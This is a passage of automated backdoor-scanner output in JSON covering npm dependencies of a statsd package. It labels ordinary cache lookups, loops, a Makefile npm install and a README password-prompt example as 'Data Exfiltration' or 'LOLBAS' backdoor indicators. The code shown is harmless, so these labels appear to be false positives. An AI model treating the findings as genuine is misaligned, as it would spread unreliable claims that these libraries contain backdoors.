                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/test/simple_lru_tests.js"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 30,
                  "endLine": 19,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n        should.not.exist(cache.get(\"a\"))\n        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n",
                    "rendered": {
                      "text": "        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n        should.not.exist(cache.get(\"a\"))\n        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n",
                      "markdown": "`        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n        should.not.exist(cache.get(\"a\"))\n        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/test/simple_lru_tests.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 13,
                  "endLine": 18,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n        should.not.exist(cache.get(\"a\"))\n        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n",
                    "rendered": {
                      "text": "        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n        should.not.exist(cache.get(\"a\"))\n        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n",
                      "markdown": "`        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n        should.not.exist(cache.get(\"a\"))\n        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/test/simple_lru_tests.js"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 13,
                  "endLine": 16,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        cache.set(\"c\",\"3\")\n        cache.get(\"a\").should.equal(\"1\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n        should.not.exist(cache.get(\"a\"))\n",
                    "rendered": {
                      "text": "        cache.set(\"c\",\"3\")\n        cache.get(\"a\").should.equal(\"1\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n        should.not.exist(cache.get(\"a\"))\n",
                      "markdown": "`        cache.set(\"c\",\"3\")\n        cache.get(\"a\").should.equal(\"1\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n        should.not.exist(cache.get(\"a\"))\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/test/simple_lru_tests.js"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 13,
                  "endLine": 15,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        cache.set(\"b\",\"2\")\n        cache.set(\"c\",\"3\")\n        cache.get(\"a\").should.equal(\"1\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n",
                    "rendered": {
                      "text": "        cache.set(\"b\",\"2\")\n        cache.set(\"c\",\"3\")\n        cache.get(\"a\").should.equal(\"1\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n",
                      "markdown": "`        cache.set(\"b\",\"2\")\n        cache.set(\"c\",\"3\")\n        cache.get(\"a\").should.equal(\"1\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/test/simple_lru_tests.js"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 13,
                  "endLine": 14,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        cache.set(\"a\",\"1\")\n        cache.set(\"b\",\"2\")\n        cache.set(\"c\",\"3\")\n        cache.get(\"a\").should.equal(\"1\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n",
                    "rendered": {
                      "text": "        cache.set(\"a\",\"1\")\n        cache.set(\"b\",\"2\")\n        cache.set(\"c\",\"3\")\n        cache.get(\"a\").should.equal(\"1\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n",
                      "markdown": "`        cache.set(\"a\",\"1\")\n        cache.set(\"b\",\"2\")\n        cache.set(\"c\",\"3\")\n        cache.get(\"a\").should.equal(\"1\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"c\").should.equal(\"3\")\n        cache.set(\"d\",\"4\")\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/test/simple_lru_tests.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 13,
                  "endLine": 7,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    it(\"Should support set and get operations\",function(){\n        var cache = new SimpleCache({maxSize:1})\n        cache.set(\"hello\",\"world\")\n        cache.get(\"hello\").should.equal(\"world\")\n    })   \n    it(\"Should drop key least used on max size\",function(){\n        var cache = new SimpleCache({maxSize:3})\n",
                    "rendered": {
                      "text": "    it(\"Should support set and get operations\",function(){\n        var cache = new SimpleCache({maxSize:1})\n        cache.set(\"hello\",\"world\")\n        cache.get(\"hello\").should.equal(\"world\")\n    })   \n    it(\"Should drop key least used on max size\",function(){\n        var cache = new SimpleCache({maxSize:3})\n",
                      "markdown": "`    it(\"Should support set and get operations\",function(){\n        var cache = new SimpleCache({maxSize:1})\n        cache.set(\"hello\",\"world\")\n        cache.get(\"hello\").should.equal(\"world\")\n    })   \n    it(\"Should drop key least used on max size\",function(){\n        var cache = new SimpleCache({maxSize:3})\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/benckmark/engine.bench.js"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 15,
                  "endLine": 17,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    , '#get() with populated cache': function() {\n\n        for (var i = 0; i < count; i++) {\n          cache.get('key' + i, i);\n        }\n\n      }\n",
                    "rendered": {
                      "text": "    , '#get() with populated cache': function() {\n\n        for (var i = 0; i < count; i++) {\n          cache.get('key' + i, i);\n        }\n\n      }\n",
                      "markdown": "`    , '#get() with populated cache': function() {\n\n        for (var i = 0; i < count; i++) {\n          cache.get('key' + i, i);\n        }\n\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/README.md"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 9,
                  "endLine": 22,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    cache.set(\"hello\",\"world\")\n\n    //Get an Object\n    cache.get(\"hello\")\n\n    //Delete an Object\n    cache.del(\"hello\")\n",
                    "rendered": {
                      "text": "    cache.set(\"hello\",\"world\")\n\n    //Get an Object\n    cache.get(\"hello\")\n\n    //Delete an Object\n    cache.del(\"hello\")\n",
                      "markdown": "`    cache.set(\"hello\",\"world\")\n\n    //Get an Object\n    cache.get(\"hello\")\n\n    //Delete an Object\n    cache.del(\"hello\")\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/Makefile"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7,
                  "endColumn": 6,
                  "snippet": {
                    "text": "bench:\n\tnpm install ttl-lru-cache\n\tnpm install lru-cache\n\tnode benckmark/bench.js \n\n.PHONY: test bench\n",
                    "rendered": {
                      "text": "bench:\n\tnpm install ttl-lru-cache\n\tnpm install lru-cache\n\tnode benckmark/bench.js \n\n.PHONY: test bench\n",
                      "markdown": "`bench:\n\tnpm install ttl-lru-cache\n\tnpm install lru-cache\n\tnode benckmark/bench.js \n\n.PHONY: test bench\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/keypress/package.json"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 26,
                  "endLine": 4,
                  "endColumn": 32,
                  "snippet": {
                    "text": "{\n  \"name\": \"keypress\",\n  \"version\": \"0.1.0\",\n  \"description\": \"Make any Node ReadableStream emit \\\"keypress\\\" events\",\n  \"author\": \"Nathan Rajlich <nathan@tootallnate.net> (http://tootallnate.net)\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n",
                    "rendered": {
                      "text": "{\n  \"name\": \"keypress\",\n  \"version\": \"0.1.0\",\n  \"description\": \"Make any Node ReadableStream emit \\\"keypress\\\" events\",\n  \"author\": \"Nathan Rajlich <nathan@tootallnate.net> (http://tootallnate.net)\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n",
                      "markdown": "`{\n  \"name\": \"keypress\",\n  \"version\": \"0.1.0\",\n  \"description\": \"Make any Node ReadableStream emit \\\"keypress\\\" events\",\n  \"author\": \"Nathan Rajlich <nathan@tootallnate.net> (http://tootallnate.net)\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n`"
                    }
                  },
                  "sourceLanguage": "package.json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/distribution.test.js"
                },
                "region": {
                  "startLine": 96,
                  "startColumn": 5,
                  "endLine": 96,
                  "endColumn": 11,
                  "snippet": {
                    "text": "\n    for (i = 0, len = iterations; i < len; i++) {\n      word = genCode(10);\n      node = ring.get(word);\n      counts[node] = counts[node] || 0;\n      counts[node]++;\n    }\n",
                    "rendered": {
                      "text": "\n    for (i = 0, len = iterations; i < len; i++) {\n      word = genCode(10);\n      node = ring.get(word);\n      counts[node] = counts[node] || 0;\n      counts[node]++;\n    }\n",
                      "markdown": "`\n    for (i = 0, len = iterations; i < len; i++) {\n      word = genCode(10);\n      node = ring.get(word);\n      counts[node] = counts[node] || 0;\n      counts[node]++;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/distribution.test.js"
                },
                "region": {
                  "startLine": 90,
                  "startColumn": 7,
                  "endLine": 90,
                  "endColumn": 13,
                  "snippet": {
                    "text": "      , word;\n\n    for (i = 0, len = nodes.length; i < len; i++) {\n        node = nodes[i];\n        counts[node] = 0;\n    }\n\n",
                    "rendered": {
                      "text": "      , word;\n\n    for (i = 0, len = nodes.length; i < len; i++) {\n        node = nodes[i];\n        counts[node] = 0;\n    }\n\n",
                      "markdown": "`      , word;\n\n    for (i = 0, len = nodes.length; i < len; i++) {\n        node = nodes[i];\n        counts[node] = 0;\n    }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/distribution.test.js"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 7,
                  "endLine": 85,
                  "snippet": {
                    "text": "    }\n\n    var counts = {}\n      , node\n      , i\n      , len\n      , word;\n\n",
                    "rendered": {
                      "text": "    }\n\n    var counts = {}\n      , node\n      , i\n      , len\n      , word;\n\n",
                      "markdown": "`    }\n\n    var counts = {}\n      , node\n      , i\n      , len\n      , word;\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/distribution.test.js"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 18,
                  "endLine": 71,
                  "endColumn": 82,
                  "snippet": {
                    "text": "\n    function genCode (length) {\n      length = length || 10;\n      var chars = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890\"\n        , numChars = chars.length\n        , ret = \"\"\n        , i = 0;\n",
                    "rendered": {
                      "text": "\n    function genCode (length) {\n      length = length || 10;\n      var chars = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890\"\n        , numChars = chars.length\n        , ret = \"\"\n        , i = 0;\n",
                      "markdown": "`\n    function genCode (length) {\n      length = length || 10;\n      var chars = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890\"\n        , numChars = chars.length\n        , ret = \"\"\n        , i = 0;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/distribution.test.js"
                },
                "region": {
                  "startLine": 96,
                  "startColumn": 17,
                  "endLine": 96,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n    for (i = 0, len = iterations; i < len; i++) {\n      word = genCode(10);\n      node = ring.get(word);\n      counts[node] = counts[node] || 0;\n      counts[node]++;\n    }\n",
                    "rendered": {
                      "text": "\n    for (i = 0, len = iterations; i < len; i++) {\n      word = genCode(10);\n      node = ring.get(word);\n      counts[node] = counts[node] || 0;\n      counts[node]++;\n    }\n",
                      "markdown": "`\n    for (i = 0, len = iterations; i < len; i++) {\n      word = genCode(10);\n      node = ring.get(word);\n      counts[node] = counts[node] || 0;\n      counts[node]++;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/distribution.test.js"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 27,
                  "endLine": 56,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    ], 'md5', { 'default port': 11211 });\n\n    for (var i=0; i < 100000; i++){\n      assume(i + ' ' + ring.get(i)).equals(fixture[i]);\n    }\n  });\n\n",
                    "rendered": {
                      "text": "    ], 'md5', { 'default port': 11211 });\n\n    for (var i=0; i < 100000; i++){\n      assume(i + ' ' + ring.get(i)).equals(fixture[i]);\n    }\n  });\n\n",
                      "markdown": "`    ], 'md5', { 'default port': 11211 });\n\n    for (var i=0; i < 100000; i++){\n      assume(i + ' ' + ring.get(i)).equals(fixture[i]);\n    }\n  });\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/distribution.test.js"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 27,
                  "endLine": 39,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    }, 'md5');\n\n    for (var i=0; i < 100000; i++){\n      assume(i + ' ' + ring.get(i)).equals(fixture[i]);\n    }\n  });\n\n",
                    "rendered": {
                      "text": "    }, 'md5');\n\n    for (var i=0; i < 100000; i++){\n      assume(i + ' ' + ring.get(i)).equals(fixture[i]);\n    }\n  });\n\n",
                      "markdown": "`    }, 'md5');\n\n    for (var i=0; i < 100000; i++){\n      assume(i + ' ' + ring.get(i)).equals(fixture[i]);\n    }\n  });\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/distribution.test.js"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 27,
                  "endLine": 22,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    }, 'md5', { compatibility: 'hash_ring' });\n\n    for (var i=0; i < 100000; i++){\n      assume(i + ' ' + ring.get(i)).equals(fixture[i]);\n    }\n  });\n\n",
                    "rendered": {
                      "text": "    }, 'md5', { compatibility: 'hash_ring' });\n\n    for (var i=0; i < 100000; i++){\n      assume(i + ' ' + ring.get(i)).equals(fixture[i]);\n    }\n  });\n\n",
                      "markdown": "`    }, 'md5', { compatibility: 'hash_ring' });\n\n    for (var i=0; i < 100000; i++){\n      assume(i + ' ' + ring.get(i)).equals(fixture[i]);\n    }\n  });\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/lib/generic-pool.js"
                },
                "region": {
                  "startLine": 292,
                  "startColumn": 5,
                  "endLine": 292,
                  "endColumn": 11,
                  "snippet": {
                    "text": "  function ensureMinimum() {\n    var i, diff;\n    if (!draining && (count < factory.min)) {\n      diff = factory.min - count;\n      for (i = 0; i < diff; i++) {\n        createResource();\n      }\n",
                    "rendered": {
                      "text": "  function ensureMinimum() {\n    var i, diff;\n    if (!draining && (count < factory.min)) {\n      diff = factory.min - count;\n      for (i = 0; i < diff; i++) {\n        createResource();\n      }\n",
                      "markdown": "`  function ensureMinimum() {\n    var i, diff;\n    if (!draining && (count < factory.min)) {\n      diff = factory.min - count;\n      for (i = 0; i < diff; i++) {\n        createResource();\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/lib/generic-pool.js"
                },
                "region": {
                  "startLine": 172,
                  "startColumn": 5,
                  "endLine": 172,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    // Go through the available (idle) items,\n    // check if they have timed out\n    for (i = 0, al = availableObjects.length; i < al && (refreshIdle || (count - factory.min > toRemove.length)); i += 1) {\n      timeout = availableObjects[i].timeout;\n      if (now >= timeout) {\n        // Client timed out, so destroy it.\n        log(\"removeIdle() destroying obj - now:\" + now + \" timeout:\" + timeout, 'verbose');\n",
                    "rendered": {
                      "text": "    // Go through the available (idle) items,\n    // check if they have timed out\n    for (i = 0, al = availableObjects.length; i < al && (refreshIdle || (count - factory.min > toRemove.length)); i += 1) {\n      timeout = availableObjects[i].timeout;\n      if (now >= timeout) {\n        // Client timed out, so destroy it.\n        log(\"removeIdle() destroying obj - now:\" + now + \" timeout:\" + timeout, 'verbose');\n",
                      "markdown": "`    // Go through the available (idle) items,\n    // check if they have timed out\n    for (i = 0, al = availableObjects.length; i < al && (refreshIdle || (count - factory.min > toRemove.length)); i += 1) {\n      timeout = availableObjects[i].timeout;\n      if (now >= timeout) {\n        // Client timed out, so destroy it.\n        log(\"removeIdle() destroying obj - now:\" + now + \" timeout:\" + timeout, 'verbose');\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/Readme.md"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 14,
                  "endLine": 102,
                  "snippet": {
                    "text": " `--help` is used.\n\n```js\n#!/usr/bin/env node\n\n/**\n * Module dependencies.\n */\n",
                    "rendered": {
                      "text": " `--help` is used.\n\n```js\n#!/usr/bin/env node\n\n/**\n * Module dependencies.\n */\n",
                      "markdown": "` `--help` is used.\n\n```js\n#!/usr/bin/env node\n\n/**\n * Module dependencies.\n */\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/Readme.md"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 14,
                  "endLine": 17,
                  "snippet": {
                    "text": " Options with commander are defined with the `.option()` method, also serving as documentation for the options. The example below parses args and options from `process.argv`, leaving remaining args as the `program.args` array which were not consumed by options.\n\n```js\n#!/usr/bin/env node\n\n/**\n * Module dependencies.\n */\n",
                    "rendered": {
                      "text": " Options with commander are defined with the `.option()` method, also serving as documentation for the options. The example below parses args and options from `process.argv`, leaving remaining args as the `program.args` array which were not consumed by options.\n\n```js\n#!/usr/bin/env node\n\n/**\n * Module dependencies.\n */\n",
                      "markdown": "` Options with commander are defined with the `.option()` method, also serving as documentation for the options. The example below parses args and options from `process.argv`, leaving remaining args as the `program.args` array which were not consumed by options.\n\n```js\n#!/usr/bin/env node\n\n/**\n * Module dependencies.\n */\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/Readme.md"
                },
                "region": {
                  "startLine": 208,
                  "startColumn": 18,
                  "endLine": 208,
                  "endColumn": 26,
                  "snippet": {
                    "text": "Prompt for password with mask char \"*\":\n\n```js\nprogram.password('Password: ', '*', function(pass){\n  console.log('got \"%s\"', pass);\n  process.stdin.destroy();\n});\n",
                    "rendered": {
